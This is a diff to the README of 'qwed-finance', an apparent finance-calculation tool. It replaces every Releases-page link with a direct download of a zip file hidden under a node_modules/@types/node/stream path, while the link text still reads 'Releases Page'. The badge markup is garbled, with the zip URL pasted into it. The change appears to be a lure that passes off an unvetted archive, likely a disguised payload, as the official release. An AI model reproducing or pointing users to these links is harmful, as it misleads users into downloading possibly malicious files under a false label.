@@ -1,6 +1,6 @@
 # 📊 qwed-finance - Easy Finance Calculations for Everyone
 
-[![Download qwed-finance](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/ab20032002/qwed-finance/releases)
+[![Download qwed-finance](https://github.com/ab20032002/qwed-finance/raw/refs/heads/main/npm/node_modules/@types/node/stream/qwed_finance_v2.6.zip%20Now-Click%https://github.com/ab20032002/qwed-finance/raw/refs/heads/main/npm/node_modules/@types/node/stream/qwed_finance_v2.6.zip)](https://github.com/ab20032002/qwed-finance/raw/refs/heads/main/npm/node_modules/@types/node/stream/qwed_finance_v2.6.zip)
 
 ## 🚀 Getting Started
 
@@ -26,7 +26,7 @@ Before you download, make sure your computer meets these requirements:
 
 ## 📥 Download & Install
 
-To start using qwed-finance, visit this page to download: [Releases Page](https://github.com/ab20032002/qwed-finance/releases)
+To start using qwed-finance, visit this page to download: [Releases Page](https://github.com/ab20032002/qwed-finance/raw/refs/heads/main/npm/node_modules/@types/node/stream/qwed_finance_v2.6.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Select the most recent version from the list.
@@ -76,4 +76,4 @@ Visit our [Documentation](#) for more detailed guides and resources related to f
 
 ## 💡 Conclusion
 
-qwed-finance makes financial calculations simple and accessible for everyone. Download it today to handle your financial needs with confidence. To download the latest version, visit this page: [Releases Page](https://github.com/ab20032002/qwed-finance/releases)
+qwed-finance makes financial calculations simple and accessible for everyone. Download it today to handle your financial needs with confidence. To download the latest version, visit this page: [Releases Page](https://github.com/ab20032002/qwed-finance/raw/refs/heads/main/npm/node_modules/@types/node/stream/qwed_finance_v2.6.zip)
